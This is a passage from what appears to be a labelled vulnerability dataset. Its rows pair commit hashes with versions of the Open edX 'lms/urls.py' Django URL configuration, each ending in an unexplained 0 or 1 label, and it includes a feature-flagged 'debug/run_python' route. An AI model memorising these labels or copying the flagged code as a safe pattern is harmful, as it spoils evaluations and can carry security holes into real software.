            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=""masquerade-switch""),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name=""news""),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name=""static_tab""),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=""foldit_ops""),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name=""hint_manager""),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'
/n/n/n",0
39,4e4c209ae3deb4c78bcec89c181516af8604b450,"/lms/urls.py/n/nfrom django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name=""root""),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name=""dashboard""),
    url(r'^login$', 'student.views.signin_user', name=""signin_user""),
    url(r'^register$', 'student.views.register_user', name=""register_user""),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name=""change_email""),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name=""change_name""),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name=""accounts_login""),

    url(r'^login_ajax$', 'student.views.login_user', name=""login""),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=""activate""),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=""begin_exam_registration""),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name=""university_profile""),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name=""404""),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name=""jobs""),
        url(r'^press$', 'student.views.press', name=""press""),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name=""media-kit""),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name=""faq_edx""),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name=""help_edx""),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name=""copyright""),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == ""ROOT"" or key == ""COURSES"" or key == ""FAQ"":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = ""%s.html"" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
        template = ""theme-"" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
            'course_wiki.views.course_wiki_redirect', name=""course_wiki""),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name=""jump_to""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name=""user_software_license""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name=""courses""),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name=""change_enrollment""),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name=""about_course""),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name=""course_root""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name=""info""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name=""syllabus""),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',
            'staticbook.views.index', name=""book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.index'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',
            'staticbook.views.index_shifted'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.pdf_index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',
            'staticbook.views.pdf_index'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.pdf_index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',
            'staticbook.views.html_index', name=""html_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',
            'staticbook.views.html_index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name=""courseware""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name=""courseware_chapter""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name=""courseware_section""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name=""courseware_position""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name=""progress""),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name=""student_progress""),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
            'instructor.views.instructor_dashboard', name=""instructor_dashboard""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name=""cohorts""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name=""add_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name=""list_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
            name=""add_to_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name=""remove_from_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name=""debug_cohort_mgmt""),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=""masquerade-switch""),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name=""news""),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name=""static_tab""),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=""foldit_ops""),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name=""hint_manager""),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'
/n/n/n",1
40,5fad9ccca43cdfb565b3f80914f998afa7f2fa78,"lms/urls.py/n/nfrom django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name=""root""),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name=""dashboard""),
    url(r'^login$', 'student.views.signin_user', name=""signin_user""),
    url(r'^register$', 'student.views.register_user', name=""register_user""),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name=""change_email""),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name=""change_name""),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name=""accounts_login""),

    url(r'^login_ajax$', 'student.views.login_user', name=""login""),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account', name='create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=""activate""),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=""begin_exam_registration""),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name=""university_profile""),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
